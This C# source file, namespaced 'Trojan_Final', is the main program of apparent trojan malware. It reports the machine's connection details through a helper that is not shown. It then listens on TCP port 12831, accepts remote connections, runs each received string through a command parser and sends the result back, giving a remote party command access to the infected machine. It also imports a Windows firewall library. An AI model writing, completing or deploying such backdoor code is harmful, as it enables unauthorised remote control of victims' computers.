using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using NetFwTypeLib;


namespace Trojan_Final
{
    class Program
    {
        static async Task<string> ListenTCP()
        {
            IPAddress ipaddr = IPAddress.Parse(NetworkDiscover.GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault());
            Console.WriteLine("Listening...");
            int portNumber = 12831;
            TcpListener tcp = new TcpListener(ipaddr, portNumber);

            Console.WriteLine(ipaddr.ToString());

            tcp.Start();
            while (true)
            {
                Socket client = tcp.AcceptSocket();
                Console.WriteLine("Connection accepted");
    

                var childSocketThread = new Thread(() =>
                {
                    byte[] data = new byte[2000];
                    int size = client.Receive(data);

                    Console.WriteLine("Recieved data: ");
                    var comanda = Encoding.ASCII.GetString(data);
                    Console.WriteLine(comanda);
                    Console.WriteLine();

                    var response = CommandParse.Parse(comanda);
                    byte[] responseData = Encoding.ASCII.GetBytes(response);
                    client.Send(responseData);


                    client.Close();
                });

                childSocketThread.Start();
            }
        }



        static void Main(string[] args)
        {
            NetworkDiscover.SendConnectionInfo().GetAwaiter().GetResult();
            ListenTCP().GetAwaiter().GetResult();

            

            Console.ReadLine();
        }
    }
}
